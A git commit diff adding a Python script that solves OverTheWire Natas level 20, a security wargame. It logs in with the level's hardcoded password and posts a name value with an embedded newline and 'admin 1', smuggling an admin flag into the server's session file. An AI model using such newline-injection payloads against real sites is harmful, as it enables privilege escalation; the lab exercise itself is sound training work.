5b85138f78185f16051fbfc5e53ceca725fa82aa
Tyler Crill <tylerc29@gmail.com>
2020-06-10 19:50:13 +0000

    natas20 complete

--- main.py
+++ main.py
@@ -1,3 +1,8 @@
 #just importing each level here 
-import natas19
+#import natas20
 from string import * 
+from natas20 import *
+
+get_source_code()
+solve_lab()
+
---
+++ natas/natas20/natas20.py
@@ -0,0 +1,32 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+import requests
+import re 
+
+usn = 'natas20'
+url = "http://%s.natas.labs.overthewire.org/?debug=true" % usn
+password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
+login = (usn, password)
+request = requests.Session()
+
+def get_source_code():
+  connection = request.get(url, auth = login)
+
+  pageContent = connection.text
+  print pageContent
+
+def solve_lab():
+    connection = request.post(url, data = {"name" : "tylerptl\nadmin 1"}, auth = login)
+    pageContent = connection.text
+    print pageContent
+
+    response = request.get(url, auth = login)
+
+    print response.text
+
+#get_source_code()
+
+print("=") * 50 
+print("=") * 50
+
+#solve_lab()
